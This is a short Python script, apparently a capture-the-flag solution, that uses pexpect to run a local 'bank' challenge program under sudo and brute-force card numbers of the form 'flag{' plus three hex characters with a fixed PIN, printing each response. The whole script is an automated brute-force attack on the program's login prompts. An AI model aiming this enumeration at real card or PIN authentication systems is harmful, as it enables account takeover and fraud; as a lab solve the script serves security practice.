#!/usr/bin/env python3
import sys
sys.path.append('./pexpect')
import pexpect
alphabet = '0123456789abcdef'

for i in alphabet:
    for j in alphabet:
        for k in alphabet:
            card = 'flag{' + i + j + k
            p = pexpect.spawn('sudo /opt/banking/bank')
            p.readline()
            p.sendline('2')
            p.expect('Please input the 8-digit card number:')
            p.sendline(card)
            p.expect('Please input the 6-digit pin:')
            p.sendline('111111')
            p.expect('Activities you could choose:')
            p.sendline('5')
            p.expect('Please enter the pin again:')
            p.sendline('111111')
            p.readline()
            p.readline()
            p.readline()
            print(p.readline())
            p.sendcontrol('c')

